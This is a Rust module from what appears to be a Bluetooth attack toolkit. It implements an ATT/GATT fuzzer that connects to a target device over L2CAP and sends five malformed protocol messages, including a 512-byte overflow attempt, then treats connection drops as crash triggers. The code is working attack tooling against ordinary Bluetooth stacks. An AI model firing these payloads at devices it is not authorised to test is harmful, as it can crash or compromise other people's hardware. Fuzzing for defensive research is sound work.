//! ATT/GATT protocol fuzzer.
//!
//! Generates malformed ATT (Attribute Protocol) PDUs to stress-test the
//! target's GATT server implementation. Fuzz vectors target common parsing
//! bugs in ATT request handlers.

use std::time::Instant;

use super::l2cap_socket::L2capSocket;
use super::{BtAttackResult, BtAttackType, BtCapture};

// ATT opcodes
const ATT_READ_BY_TYPE_REQ: u8 = 0x08;
const ATT_WRITE_REQ: u8 = 0x12;
const ATT_FIND_INFO_REQ: u8 = 0x04;
const ATT_READ_BLOB_REQ: u8 = 0x0C;
const ATT_PREPARE_WRITE_REQ: u8 = 0x16;

/// ATT/GATT fuzzer: injects malformed ATT PDUs over a real L2CAP socket to
/// stress the target's GATT server.
///
/// Fuzz vectors:
/// 1. Read By Type with invalid handle range (start > end)
/// 2. Write Request with empty value
/// 3. Find Information with reversed handle range
/// 4. Read Blob with maximum offset (0xFFFF)
/// 5. Prepare Write with oversized value (overflow attempt)
///
/// `addr_type`: 0 = BDADDR_BREDR, 1 = BDADDR_LE_PUBLIC, 2 = BDADDR_LE_RANDOM.
pub fn run(target_addr: &str, addr_type: u8) -> BtAttackResult {
    let start = Instant::now();
    log::info!("att_fuzz: targeting {} with malformed ATT PDUs", target_addr);

    // Open ATT fixed channel (PSM=0, CID=0x0004).
    let sock = match L2capSocket::connect(target_addr, addr_type, 0, 0x0004) {
        Ok(s) => s,
        Err(e) => {
            return BtAttackResult {
                attack_type: BtAttackType::AttGattFuzz,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(format!("L2CAP connect failed: {}", e)),
                timestamp: start,
            };
        }
    };

    let fuzz_vectors = build_fuzz_vectors();
    let mut sent_count: usize = 0;
    let mut crash_trigger: Option<Vec<u8>> = None;

    for (name, payload) in &fuzz_vectors {
        log::info!(
            "att_fuzz: sending {} ({} bytes): {:02x?}",
            name,
            payload.len(),
            &payload[..payload.len().min(32)]
        );

        match sock.send(payload) {
            Ok(_) => {
                sent_count += 1;
                // Short receive to detect crash / connection drop.
                let mut resp = [0u8; 256];
                if let Err(e) = sock.recv(&mut resp, 1000) {
                    log::info!("att_fuzz: recv failed after {} (possible crash): {}", name, e);
                    crash_trigger = Some(payload.clone());
                }
            }
            Err(e) => {
                // Send failure likely means the target crashed / dropped the link.
                log::info!("att_fuzz: send failed on {} (possible crash): {}", name, e);
                crash_trigger = Some(payload.clone());
                break;
            }
        }
    }

    let capture = crash_trigger.map(|trigger| BtCapture::FuzzCrash {
        address: target_addr.to_string(),
        trigger,
    });

    BtAttackResult {
        attack_type: BtAttackType::AttGattFuzz,
        target_address: target_addr.to_string(),
        target_name: None,
        success: sent_count > 0,
        capture,
        error: None,
        timestamp: start,
    }
}

/// Build the set of malformed ATT PDUs.
fn build_fuzz_vectors() -> Vec<(&'static str, Vec<u8>)> {
    vec![
        ("read_by_type_invalid_range", build_read_by_type_invalid()),
        ("write_empty", build_write_empty()),
        ("find_info_reversed", build_find_info_reversed()),
        ("read_blob_max_offset", build_read_blob_max_offset()),
        ("prepare_write_overflow", build_prepare_write_overflow()),
    ]
}

/// Read By Type Request with start_handle=0xFFFF, end_handle=0x0001 (invalid).
fn build_read_by_type_invalid() -> Vec<u8> {
    let mut pdu = Vec::new();
    pdu.push(ATT_READ_BY_TYPE_REQ);
    pdu.extend_from_slice(&0xFFFFu16.to_le_bytes()); // start_handle: max
    pdu.extend_from_slice(&0x0001u16.to_le_bytes()); // end_handle: 1 (start > end)
    pdu.extend_from_slice(&0x2803u16.to_le_bytes()); // UUID: characteristic decl
    pdu
}

/// Write Request to handle 0x0001 with empty value.
fn build_write_empty() -> Vec<u8> {
    let mut pdu = Vec::new();
    pdu.push(ATT_WRITE_REQ);
    pdu.extend_from_slice(&0x0001u16.to_le_bytes()); // handle
    // No value bytes — empty write
    pdu
}

/// Find Information Request with start=0xFFFF, end=0x0001 (reversed).
fn build_find_info_reversed() -> Vec<u8> {
    let mut pdu = Vec::new();
    pdu.push(ATT_FIND_INFO_REQ);
    pdu.extend_from_slice(&0xFFFFu16.to_le_bytes()); // start_handle
    pdu.extend_from_slice(&0x0001u16.to_le_bytes()); // end_handle (< start)
    pdu
}

/// Read Blob Request at handle 0x0001 with offset 0xFFFF (max).
fn build_read_blob_max_offset() -> Vec<u8> {
    let mut pdu = Vec::new();
    pdu.push(ATT_READ_BLOB_REQ);
    pdu.extend_from_slice(&0x0001u16.to_le_bytes()); // handle
    pdu.extend_from_slice(&0xFFFFu16.to_le_bytes()); // offset: max
    pdu
}

/// Prepare Write Request with 512 bytes of 0x41 ('A') — overflow attempt.
fn build_prepare_write_overflow() -> Vec<u8> {
    let mut pdu = Vec::new();
    pdu.push(ATT_PREPARE_WRITE_REQ);
    pdu.extend_from_slice(&0x0001u16.to_le_bytes()); // handle
    pdu.extend_from_slice(&0x0000u16.to_le_bytes()); // offset: 0
    pdu.extend_from_slice(&vec![0x41; 512]); // value: 512 bytes of 'A'
    pdu
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fuzz_vectors_built() {
        let vectors = build_fuzz_vectors();
        assert_eq!(vectors.len(), 5);
        for (name, payload) in &vectors {
            assert!(!name.is_empty());
            assert!(!payload.is_empty());
        }
    }

    #[test]
    fn test_read_by_type_invalid_format() {
        let pdu = build_read_by_type_invalid();
        assert_eq!(pdu[0], ATT_READ_BY_TYPE_REQ);
        // start_handle = 0xFFFF
        assert_eq!(pdu[1], 0xFF);
        assert_eq!(pdu[2], 0xFF);
        // end_handle = 0x0001
        assert_eq!(pdu[3], 0x01);
        assert_eq!(pdu[4], 0x00);
    }

    #[test]
    fn test_prepare_write_overflow_size() {
        let pdu = build_prepare_write_overflow();
        // opcode(1) + handle(2) + offset(2) + value(512) = 517
        assert_eq!(pdu.len(), 517);
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_stub() {
        let result = run("AA:BB:CC:DD:EE:FF", 1);
        assert_eq!(result.attack_type, BtAttackType::AttGattFuzz);
        assert!(result.success);
        assert!(result.capture.is_some());
    }
}
